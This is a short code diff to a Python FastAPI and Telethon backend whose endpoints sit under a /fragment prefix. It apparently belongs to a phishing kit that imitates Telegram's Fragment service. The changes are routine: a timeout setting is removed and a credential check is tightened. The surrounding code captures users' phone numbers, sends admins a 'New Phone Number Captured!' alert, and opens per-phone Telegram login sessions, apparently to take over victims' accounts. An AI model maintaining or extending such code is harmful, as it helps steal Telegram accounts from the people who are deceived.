@@ -6,7 +6,6 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse
 from aiogram import Bot, types
 from aiogram.client.session.aiohttp import AiohttpSession
-from aiohttp import ClientTimeout
 from telethon import TelegramClient, errors
 from pydantic import BaseModel
 from dotenv import load_dotenv
@@ -18,8 +17,7 @@ API_ID = os.getenv("TELEGRAM_API_ID")
 API_HASH = os.getenv("TELEGRAM_API_HASH")
 
 # Robust session for background notifications
-admin_session = AiohttpSession(timeout=ClientTimeout(total=60, connect=20))
-admin_bot = Bot(token=ADMIN_BOT_TOKEN, session=admin_session)
+admin_bot = Bot(token=ADMIN_BOT_TOKEN)
 app = FastAPI()
 
 # We use a router to prefix all API endpoints with /fragment
@@ -84,7 +82,7 @@ async def submit_phone(data: PhoneData):
     user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
     await notify_admins(f"📞 *New Phone Number Captured!*\n\n{user_info}\nPhone: `{data.phone}`")
 
-    if API_ID and API_HASH:
+    if API_ID and API_HASH and API_ID.strip() and API_HASH.strip():
         session_path = f"sessions/{data.phone}"
         client = TelegramClient(session_path, int(API_ID), API_HASH)
         await client.connect()
